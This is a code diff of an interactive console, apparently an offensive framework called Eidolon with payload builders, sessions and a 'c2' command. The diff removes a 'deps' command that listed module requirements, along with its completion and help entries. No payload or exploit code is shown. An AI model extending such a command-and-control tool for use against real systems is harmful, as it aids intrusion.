-        reqs = getattr(mod, "REQUIREMENTS", None) or []
-        missing = _missing_requirements(reqs)
-        if missing:
-            warn(f"missing requirements: {', '.join(missing)} — see {C.PINK}deps {name}{C.RESET}")
         self.do_options("")
 
     def _session_interact(self, ref):
@@ -2609,20 +2997,6 @@ class Eidolon(cmd.Cmd):
                     info(f"registered payload: {C.CYAN}{n}{C.RESET} — {wstore.summary(manifest)}")
             except ImportError:
                 pass
-
-    def do_deps(self, arg):
-        """deps <module> — Show module pip requirements (printed, never installed)"""
-        name = self._resolve(arg.strip())
-        if not name or name not in self.modules:
-            return err(f"module '{arg.strip()}' not found or not loaded")
-        reqs = [str(r) for r in (getattr(self.modules[name], "REQUIREMENTS", None) or [])]
-        if not reqs:
-            return info(f"'{name}' declares no REQUIREMENTS")
-        missing = _missing_requirements(reqs)
-        rows = [[r, f"{C.RED}missing{C.RESET}" if r in missing else f"{C.GREEN}present{C.RESET}"] for r in reqs]
-        print_table(["Requirement", "Status"], rows, title=f"REQUIREMENTS · {name}")
-        warn("the framework never installs anything automatically (security)")
-        info(f"install manually: {C.BOLD}pip install {' '.join(reqs)}{C.RESET}")
 
     def do_gen(self, arg):
         """gen <payload module> — select a payload BUILDER; params via set, build via run"""
@@ -3026,10 +3400,6 @@ class Eidolon(cmd.Cmd):
         if len(parts) <= 1:
             return [x for x in ("status", "sessions", "payloads") if x.startswith(text)]
         return []
-    def complete_deps(self, text, line, begidx, endidx):
-        if len(line.split()) <= 1:
-            return [m for m in self.modules if m.startswith(text)]
-        return []
     def complete_show(self, text, line, begidx, endidx):
         if len(line.split()) <= 1:
             return [x for x in ("options", "modules") if x.startswith(text)]
@@ -3041,7 +3411,7 @@ class Eidolon(cmd.Cmd):
     def complete_unset(self, text, *_): return self.complete_set(text, *_)
     def complete_help(self, text, *_):
         cmds = ["help","banner","clear","reload","exit","modules","ls","search","info","use","back",
-                "options","set","unset","run","sessions","deps","new_module","add_module","install_local","remove",
+                "options","set","unset","run","sessions","new_module","add_module","install_local","remove",
                 "setg","globals","status","repo","c2",
                 "trust","untrust","trusted","verify"]
         return [x for x in cmds if x.startswith(text)]
